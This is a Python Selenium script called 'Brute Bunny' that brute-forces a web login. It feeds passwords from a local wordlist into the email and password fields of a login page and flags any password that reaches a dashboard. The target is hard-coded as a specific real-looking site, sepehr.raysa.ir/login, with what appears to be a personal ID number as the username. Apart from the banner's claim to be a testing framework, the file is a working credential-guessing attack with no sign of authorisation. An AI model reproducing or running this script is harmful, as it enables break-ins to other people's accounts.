import os
import sys
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from time import sleep
from colorama import Fore, init
from pyfiglet import Figlet

# Initialize colorama for colored terminal output
init(autoreset=True)

# ASCII art for aesthetics
def display_banner():
    fig = Figlet(font="slant")
    print(Fore.MAGENTA + fig.renderText("Brute Bunny"))
    print(Fore.CYAN + "   --- Welcome to Brute Bunny Tool ---")
    print(Fore.CYAN + "   Fast, Reliable, and Secure Testing Framework")
    print(Fore.CYAN + "-" * 50 + "\n")

# Selenium WebDriver setup
chrome_options = Options()
chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
chrome_driver_path = "C:\\Users\\devbu\\OneDrive\\Desktop\\Brute-force\\chromedriver-win64\\chromedriver.exe"  # Update this path

service = Service(chrome_driver_path)
driver = webdriver.Chrome(service=service, options=chrome_options)

# Function to perform brute force attack
def brute_force_login(url, username, passwords):
    print(Fore.CYAN + f"[*] Starting brute force on {url}...")
    print(Fore.CYAN + f"[*] Username: {username}")
    print(Fore.CYAN + f"[*] Loaded {len(passwords)} passwords from the wordlist.\n")

    # Open the login page
    driver.get(url)
    sleep(3)  # Allow time for the page to load

    # Locate username and password fields
    try:
        username_field = driver.find_element(By.NAME, "email")  # Replace with the correct field name
        password_field = driver.find_element(By.NAME, "password")  # Replace with the correct field name
    except Exception as e:
        print(Fore.RED + f"[!] Error locating fields: {e}")
        driver.quit()
        sys.exit(1)

    # Enter username once
    username_field.clear()
    username_field.send_keys(username)
    sleep(1)  # Small delay to ensure the username is entered

    # Iterate over passwords
    for index, password in enumerate(passwords, start=1):
        try:
            print(Fore.MAGENTA + f"[*] Trying password: {password} (Attempt {index})")

            # **Clear and enter password strictly**
            password_field.send_keys(Keys.CONTROL + "a")  # Select all text in the field
            password_field.send_keys(Keys.DELETE)  # Delete the selected text
            sleep(0.5)  # Short delay to ensure clearing happens

            password_field.send_keys(password)  # Input new password
            password_field.send_keys(Keys.RETURN)  # Submit the form
            sleep(2)  # Adjust this based on site response time

            # Check for success
            if "Dashboard" in driver.title or "Welcome" in driver.page_source:
                print(Fore.GREEN + f"[+] Password found: {password}")
                return True

            print(Fore.RED + "[-] Incorrect password.")

        except Exception as e:
            print(Fore.RED + f"[!] Error during attempt: {e}")

    print(Fore.RED + "[!] Brute force failed: No valid password found.")
    return False

# Main function
def main():
    # Display ASCII art
    display_banner()

    # Target details
    url = "https://sepehr.raysa.ir/login"
    username = "0202043452"
    wordlist_path = "C:\\Users\\devbu\\OneDrive\\Desktop\\Brute-force\\passwords.txt"  # Use the uploaded file

    # Load the wordlist
    try:
        with open(wordlist_path, "r") as file:
            passwords = [line.strip() for line in file]
    except Exception as e:
        print(Fore.RED + f"[!] Error loading wordlist: {e}")
        sys.exit(1)

    # Start brute force attack
    if brute_force_login(url, username, passwords):
        print(Fore.GREEN + "[!] Brute force succeeded!")
    else:
        print(Fore.RED + "[!] Brute force finished without success.")

    # Close the browser
    driver.quit()

if __name__ == "__main__":
    main()
